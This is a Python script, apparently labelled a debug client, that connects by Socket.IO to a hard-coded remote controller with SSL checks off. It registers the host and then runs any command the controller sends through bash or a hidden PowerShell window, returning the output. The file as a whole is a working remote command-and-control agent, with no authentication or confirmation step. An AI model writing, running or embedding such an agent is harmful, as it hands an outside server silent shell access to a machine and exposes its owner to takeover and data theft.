#!/usr/bin/env python3
"""
Debug Simple Client for Command Execution Testing
================================================

This is a debug version of simple-client.py that provides detailed logging
to help identify issues with command execution and result handling.

Usage:
    python3 debug-simple-client.py [--url CONTROLLER_URL]
"""

import os
import sys
import time
import json
import logging
import signal
import subprocess
import platform
import argparse
from datetime import datetime

# Configure detailed logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Configuration
DEFAULT_CONTROLLER_URL = os.environ.get('CONTROLLER_URL', 'https://agent-controller-backend.onrender.com')
AGENT_ID = f"debug-client-{int(time.time())}"
CONNECTION_TIMEOUT = 30
HEARTBEAT_INTERVAL = 10

# Global state
connected = False
connection_start_time = None
last_heartbeat = None
message_count = 0
shutdown_requested = False
sio = None
controller_url = DEFAULT_CONTROLLER_URL

def signal_handler(signum, frame):
    """Handle shutdown signals gracefully"""
    global shutdown_requested
    print(f"🛑 Shutdown signal received, closing connections...")
    shutdown_requested = True

def log_message(message, level="info"):
    """Enhanced logging function with colors"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    colors = {
        "info": "\033[94m",      # Blue
        "success": "\033[92m",   # Green
        "warning": "\033[93m",   # Yellow
        "error": "\033[91m",     # Red
        "debug": "\033[95m",     # Magenta
        "reset": "\033[0m"       # Reset
    }
    
    color = colors.get(level, colors["info"])
    reset = colors["reset"]
    print(f"{color}[{timestamp}] {level.upper()}: {message}{reset}")

def execute_command(command):
    """Execute a command and return its output"""
    try:
        log_message(f"🔧 Executing command: '{command}'", "debug")
        
        if platform.system() == "Windows":
            # Use PowerShell on Windows
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", command],
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            # Use bash on Linux/Unix systems
            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True,
                text=True,
                timeout=30
            )
        
        output = result.stdout + result.stderr
        if not output:
            output = "[No output from command]"
        
        log_message(f"✅ Command executed successfully", "success")
        log_message(f"📄 Output length: {len(output)} characters", "debug")
        log_message(f"📄 Output preview: {output[:100]}{'...' if len(output) > 100 else ''}", "debug")
        return output
        
    except subprocess.TimeoutExpired:
        error_msg = "Command execution timed out after 30 seconds"
        log_message(error_msg, "error")
        return error_msg
    except FileNotFoundError:
        if platform.system() == "Windows":
            error_msg = "PowerShell not found. Command execution failed."
        else:
            error_msg = "Bash not found. Command execution failed."
        log_message(error_msg, "error")
        return error_msg
    except Exception as e:
        error_msg = f"Command execution failed: {e}"
        log_message(error_msg, "error")
        return error_msg

def test_socketio_connection():
    """Test Socket.IO connection to controller with detailed debugging"""
    global sio
    
    try:
        import socketio
        
        log_message("🔌 Testing Socket.IO connection...", "info")
        
        # Create Socket.IO client
        sio = socketio.Client(
            ssl_verify=False,  # Disable SSL verification for testing
            engineio_logger=True,  # Enable engine.io logging
            logger=True  # Enable socket.io logging
        )
        
        # Connection event handlers
        @sio.event
        def connect():
            global connected, connection_start_time, last_heartbeat
            connected = True
            connection_start_time = time.time()
            last_heartbeat = time.time()
            log_message("✅ Socket.IO connection established!", "success")
            
            # Send initial agent registration
            agent_data = {
                'agent_id': AGENT_ID,
                'name': f'Debug-Client-{AGENT_ID.split("-")[-1]}',
                'platform': platform.system(),
                'hostname': platform.node(),
                'python_version': platform.python_version(),
                'timestamp': time.time(),
                'ip': '127.0.0.1',
                'capabilities': ['screen', 'files', 'commands'],
                'cpu_usage': 0,
                'memory_usage': 0,
                'network_usage': 0
            }
            
            log_message(f"📝 Sending agent registration: {json.dumps(agent_data, indent=2)}", "debug")
            sio.emit('agent_connect', agent_data)
            log_message("📝 Agent registration sent", "info")
        
        @sio.event
        def disconnect():
            global connected
            connected = False
            log_message("❌ Socket.IO connection lost", "warning")
        
        @sio.event
        def connect_error(data):
            log_message(f"❌ Socket.IO connection error: {data}", "error")
        
        @sio.event
        def pong(data):
            global last_heartbeat, message_count
            last_heartbeat = time.time()
            message_count += 1
            log_message(f"📡 Heartbeat received (message #{message_count}): {data}", "debug")
        
        @sio.event
        def command(data):
            """Handle command execution requests from controller"""
            global message_count
            message_count += 1
            
            log_message(f"📨 Command event received: {json.dumps(data, indent=2)}", "debug")
            
            command_text = data.get('command', '')
            execution_id = data.get('execution_id', 'unknown')
            
            log_message(f"📨 Command received: '{command_text}'", "info")
            log_message(f"📋 Execution ID: {execution_id}", "info")
            
            # Execute the command
            output = execute_command(command_text)
            
            # Prepare command result
            result_data = {
                'agent_id': AGENT_ID,
                'execution_id': execution_id,
                'command': command_text,
                'output': output,
                'success': True,
                'execution_time': 0,
                'timestamp': datetime.now().isoformat() + 'Z'
            }
            
            log_message(f"📤 Sending command result: {json.dumps(result_data, indent=2)}", "debug")
            
            # Send command result back to controller
            sio.emit('command_result', result_data)
            
            log_message("📤 Command result sent to controller", "success")
        
        @sio.event
        def agent_registered(data):
            log_message(f"✅ Agent registration confirmed: {json.dumps(data, indent=2)}", "success")
        
        @sio.event
        def agent_list_update(data):
            log_message(f"📋 Agent list updated: {len(data)} agents", "info")
            for agent_id, agent_data in data.items():
                status = agent_data.get('status', 'unknown')
                name = agent_data.get('name', agent_id)
                log_message(f"   - {name} ({agent_id}): {status}", "info")
        
        @sio.event
        def registration_error(data):
            log_message(f"❌ Registration error: {json.dumps(data, indent=2)}", "error")
        
        # Connect to controller
        log_message(f"🔌 Connecting to {controller_url}...", "info")
        sio.connect(controller_url, wait_timeout=CONNECTION_TIMEOUT)
        
        # Keep connection alive and send heartbeats
        try:
            while connected and not shutdown_requested:
                time.sleep(HEARTBEAT_INTERVAL)
                
                if connected and not shutdown_requested:
                    # Send ping
                    ping_data = {
                        'agent_id': AGENT_ID,
                        'timestamp': time.time(),
                        'uptime': time.time() - connection_start_time if connection_start_time else 0
                    }
                    log_message(f"📡 Sending ping: {json.dumps(ping_data, indent=2)}", "debug")
                    sio.emit('ping', ping_data)
                    
                    # Check connection health
                    if last_heartbeat and (time.time() - last_heartbeat) > (HEARTBEAT_INTERVAL * 3):
                        log_message("❌ No heartbeat received, connection may be stale", "warning")
                else:
                    break
                    
        except KeyboardInterrupt:
            log_message("🛑 Interrupted by user", "warning")
        except Exception as e:
            log_message(f"❌ Connection error: {e}", "error")
        
        return True
        
    except ImportError:
        log_message("❌ python-socketio library not available", "error")
        log_message("Install with: pip install python-socketio", "info")
        return False
    except Exception as e:
        log_message(f"❌ Socket.IO connection failed: {e}", "error")
        return False
    finally:
        if sio and connected:
            sio.disconnect()
            log_message("🔌 Disconnected from controller", "info")

def main():
    """Main function"""
    global controller_url
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='Debug Simple Client for Command Execution Testing')
    parser.add_argument('--url', default=DEFAULT_CONTROLLER_URL, 
                       help=f'Controller URL (default: {DEFAULT_CONTROLLER_URL})')
    
    args = parser.parse_args()
    controller_url = args.url
    
    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    print("🐛 Debug Simple Client - Command Execution Testing")
    print("=" * 60)
    print(f"Target Controller: {controller_url}")
    print(f"Agent ID: {AGENT_ID}")
    print("=" * 60)
    
    # Test Socket.IO connection
    log_message("🔌 Starting Socket.IO connection test...", "info")
    socketio_success = test_socketio_connection()
    
    if socketio_success and connected:
        log_message("✅ Connection test completed successfully!", "success")
        return True
    else:
        log_message("❌ Connection test failed", "error")
        return False

if __name__ == "__main__":
    try:
        success = main()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        log_message("🛑 Test interrupted by user", "warning")
        sys.exit(1)
    except Exception as e:
        log_message(f"❌ Unexpected error: {e}", "error")
        sys.exit(1)